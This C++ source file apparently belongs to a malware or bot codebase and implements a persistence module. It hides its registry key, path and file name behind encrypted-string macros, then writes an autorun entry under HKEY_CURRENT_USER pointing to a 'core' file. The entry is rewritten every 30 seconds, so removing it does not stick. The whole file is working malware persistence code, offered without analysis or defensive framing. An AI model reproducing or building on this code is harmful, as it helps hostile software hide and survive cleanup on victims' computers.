#include "stdafx.h"
#include "kernel.h"
#include "persistencemodule.h"
#include "cryptedstrings.h"
#include "registry.h"
#include "filesystem.h"
#include "string.h"

void PersistenceModule::init()
{

}

void PersistenceModule::uninit()
{
	
}

DWORD WINAPI PersistenceModule::_procAutorun(void * p)
{
	if (Kernel::isAlive())
	{
		CSTRW(regKey, regkey_autorun);
		CSTRW(regPath, regpath_autorun);
		CSTRW(coreFile, path_core);

		WCHAR path[MAX_PATH];

		if (!FileSystem::combinePath(path, kernelData.paths.home, coreFile)) return 1;

		PathQuoteSpacesW(path);

		while (WaitForSingleObject(kernelData.globalEvents.stopEvent, 30000) == WAIT_TIMEOUT)
		{
			Registry::_setValueAsString(HKEY_CURRENT_USER, regPath, regKey, path, String::_LengthW(path));
		}
	}
	return 0;
}